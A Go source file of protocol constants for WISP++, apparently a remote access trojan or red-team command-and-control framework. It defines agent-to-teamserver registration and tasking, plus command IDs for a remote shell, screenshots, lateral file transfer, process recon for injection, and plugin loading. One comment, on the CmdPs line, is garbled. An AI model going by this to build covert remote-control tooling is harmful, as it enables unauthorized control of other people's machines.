package protocol

// Wire constants for WISP++ Type1~4 protocols.

// Magic bytes for binary packet framing (Type1-TCP / Type2 / Type3 channels).
var Magic = [4]byte{'W', 'I', 'S', 'P'}

// ProtocolVersion is the envelope version negotiated at registration.
const ProtocolVersion = 2

// Register hardening (plan P6): the replay window on RegisterInfo.ts and the
// minimum nonce length enforced by the teamserver.
const (
	RegisterMaxSkew     = 300 // ±seconds
	MinRegisterNonceLen = 16
)

// Packet framing.
const (
	// HeaderSize is Magic(4) + Size(4) + Type(1).
	HeaderSize = 9
	// MaxPacketSize caps a single payload at 10MB (chunked transfers go through Type3 flow control).
	MaxPacketSize = 10 * 1024 * 1024
)

// Binary packet types (Type1 over TCP, and the shared message taxonomy).
const (
	TypeRegister    byte = 0x01 // Agent -> Server: initial registration
	TypeRegisterAck byte = 0x02 // Server -> Agent: registration confirmed
	TypeCheckin     byte = 0x03 // Agent -> Server: heartbeat / poll tasks
	TypeTask        byte = 0x04 // Server -> Agent: task assignment
	TypeResult      byte = 0x05 // Agent -> Server: task result
	TypeClose       byte = 0x06 // Both: connection close
	TypeRequestKey  byte = 0x07 // Agent -> Server: request the RSA public key
	TypeServerKey   byte = 0x08 // Server -> Agent: RSA public key PEM
	TypeEnvelope    byte = 0x09 // Any: JSON envelope carried raw (TCP transport)
)

// Envelope message types (Type1 over HTTP). The server response echoes the
// request type; checkin responses carry a sealed Task (or null) as data.
const (
	MsgRegister    = "register"     // -> RegisterInfo (plaintext, pre-session)
	MsgRegisterAck = "register_ack" // <- RegisterAck
	MsgCheckin     = "checkin"      // -> sealed Heartbeat; <- sealed Task|null
	MsgResult      = "result"       // -> sealed TaskResult; <- sealed ack
	MsgPubkey      = "pubkey"       // -> plain request; <- plain PubkeyInfo (pre-session)
)

// Command IDs. Numbering is compatible with RAT-WISP so old audit/replay tools
// keep working; WISP++ core only implements the subset marked M0/M2, the rest
// land with their milestones or as plugins (plan §5).
const (
	CmdShell         uint32 = 1  // M2
	CmdSysinfo       uint32 = 9  // M2
	CmdSleep         uint32 = 10 // M1
	CmdExit          uint32 = 11 // M2
	CmdLsJSON        uint32 = 12 // M4
	CmdMkdir         uint32 = 13 // M4
	CmdRm            uint32 = 14 // M4
	CmdPwd           uint32 = 26 // M2
	CmdClientKill    uint32 = 27
	CmdRCPConnect    uint32 = 23 // M3 (on-demand Type2 dial, args carry addr/token)
	CmdRCPDisconnect uint32 = 24 // M3 (tear Type2 down)
	CmdRekey         uint32 = 22 // P6 (rotate the Type1 session key)

	// Plugin platform (60-61, plan §5): dynamic WASM modules, Ed25519-gated.
	CmdP2PBridge uint32 = 65 // Type2.5: operator<->agent WebRTC (docs/P2P_DESIGN.md)
	CmdP2PStop   uint32 = 66
	CmdXferServe uint32 = 67 // M8 lateral: bind one-shot intra-net listener, stream a file out
	CmdXferFetch uint32 = 68
	CmdPs        uint32 = 69 // process enumeration (injection/migration recon) // M8 lateral: pull a file from a serving agent

	CmdPluginLoad uint32 = 60
	CmdPluginExec uint32 = 61

	// Computer management (28-31, numbering compatible with RAT-WISP).
	CmdHostReboot   uint32 = 28
	CmdHostShutdown uint32 = 29
	CmdHostLogoff   uint32 = 30
	CmdHostLock     uint32 = 31
	CmdScreenshot   uint32 = 25 // M2
)

// Sleep/jitter boundaries shared by agent, server and payload builder.
const (
	MinSleepMS   = 10
	MaxJitterPct = 100
)

// Session status (server-side state machine, plan §2.2).
const (
	StatusOnline  = "online"
	StatusIdle    = "idle"
	StatusOffline = "offline"
)

// Task status.
const (
	TaskPending   = "pending"
	TaskSent      = "sent"
	TaskCompleted = "completed"
	TaskFailed    = "failed"
)
